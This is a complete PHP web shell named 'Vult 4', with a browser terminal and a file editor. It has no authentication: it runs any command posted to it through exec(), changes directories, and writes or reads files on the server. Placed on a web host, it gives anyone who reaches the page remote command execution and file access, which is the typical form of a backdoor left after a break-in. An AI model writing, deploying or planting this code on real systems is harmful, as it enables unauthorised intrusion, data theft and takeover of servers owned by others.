<?php
session_start();

if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

function is_binary($file) {
    $file_content = file_get_contents($file, false, null, 0, 512);
    return (bool) preg_match('~[^\x20-\x7E\t\r\n]~', $file_content);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['editor_content'], $_POST['file_name']) && isset($_POST['save_file'])) {
        $file_name = preg_replace('/[^a-zA-Z0-9_.-]/', '_', $_POST['file_name']);
        file_put_contents($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $file_name, $_POST['editor_content']);
        echo "File saved: " . htmlspecialchars($file_name, ENT_QUOTES, 'UTF-8');
        exit;
    }

    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        if (preg_match('/^cd\s+(.+)$/', $command, $matches)) {
            $new_dir = $matches[1];
            if (chdir($new_dir)) {
                $_SESSION['current_dir'] = getcwd();
                echo "Directory changed to: " . $_SESSION['current_dir'];
            } else {
                echo "Failed to change directory.";
            }
        } else {
            $output = [];
            $returnValue = null;
            chdir($_SESSION['current_dir']);
            exec(escapeshellcmd($command) . ' 2>&1', $output, $returnValue);

            if ($returnValue === 0) {
                echo implode("\n", $output) . "\n";
            } else if (empty($output)) {
                echo "Command failed to execute and produced no output.\n";
            } else {
                echo "Error: " . implode("\n", $output) . "\n";
            }
        }
        exit;
    }

    if (isset($_POST['loadFile'])) {
        $fileName = $_POST['loadFile'];
        $filePath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName;
        if (file_exists($filePath) && is_readable($filePath)) {
            if (is_binary($filePath)) {
                echo "Error: Cannot display binary file content.";
            } else {
                echo file_get_contents($filePath);
            }
        } else {
            echo "Error: Cannot open the file. Please check the file name and try again.";
        }
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Vult 4</title>
    <style>
        body {
            font-family: monospace;
        }
        #file-operations, #editor, #terminal {
            width: 100%;
            margin-bottom: 10px;
        }
        #editor {
            background-color: #272822;
            color: #f8f8f2;
            border: none;
            padding: 10px;
            margin: 0;
            width: 100%;
            height: 45vh;
            box-sizing: border-box;
            resize: none;
            outline: none;
        }
        #terminal {
            width: 100%;
            height: 45vh;
            background-color: #2e2e2e;
            color: lime;
            padding: 10px;
            box-sizing: border-box;
            overflow-y: auto;
        }
        #terminal-input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #2e2e2e;
            background-color: #2e2e2e;
            color: lime;
        }
    </style>
</head>
<body>
<div id="file-operations">
    <input type="text" id="file-name" placeholder="Enter file name">
    <button id="set-button">Set</button>
    <button id="get-button">Get</button>
</div>
<textarea id="editor" placeholder="Type your code here..."></textarea>
<div id="terminal">
    <div id="terminal-output"></div>
    <input type="text" id="terminal-input" placeholder="Enter command">
</div>
<script>
    const input = document.getElementById('terminal-input');
    const outputDiv = document.getElementById('terminal-output');

    input.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            const command = this.value.trim();
            if (command) {
                outputDiv.innerHTML += "$ " + command + "\n";
                this.value = '';

                fetch('', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'command=' + encodeURIComponent(command)
                })
                    .then(response => response.text())
                    .then((text) => {
                        let pre = document.createElement('pre');
                        pre.textContent = text;
                        outputDiv.appendChild(pre);
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    })
                    .catch((error) => {
                        outputDiv.innerHTML += "Error: " + error.message;
                    });
            }
        }
    });

    document.getElementById('set-button').addEventListener('click', function() {
        const filename = document.getElementById('file-name').value;
        const content = document.getElementById('editor').value;

        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'file_name=' + encodeURIComponent(filename) + '&editor_content=' + encodeURIComponent(content) + '&save_file=1'
        })
            .then(response => response.text())
            .then((text) => {
                let pre = document.createElement('pre');
                pre.textContent = text;
                outputDiv.appendChild(pre);
                outputDiv.scrollTop = outputDiv.scrollHeight;
            })
            .catch((error) => {
                outputDiv.innerHTML += "Error: " + error.message;
            });
    });

    document.getElementById('get-button').addEventListener('click', function() {
        const filename = document.getElementById('file-name').value;

        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'loadFile=' + encodeURIComponent(filename)
        })
            .then(response => response.text())
            .then((text) => {
                let pre = document.createElement('pre');
                if (text.startsWith('Error:')) {
                    pre.textContent = text;
                    outputDiv.appendChild(pre);
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                } else {
                    document.getElementById('editor').value = text;
                    pre.textContent = "File loaded successfully.";
                    outputDiv.appendChild(pre);
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                }
            })
            .catch((error) => {
                let pre = document.createElement('pre');
                pre.textContent = "Error: " + error.message;
                outputDiv.appendChild(pre);
                outputDiv.scrollTop = outputDiv.scrollHeight;
            });
    });
</script>
</body>
</html>
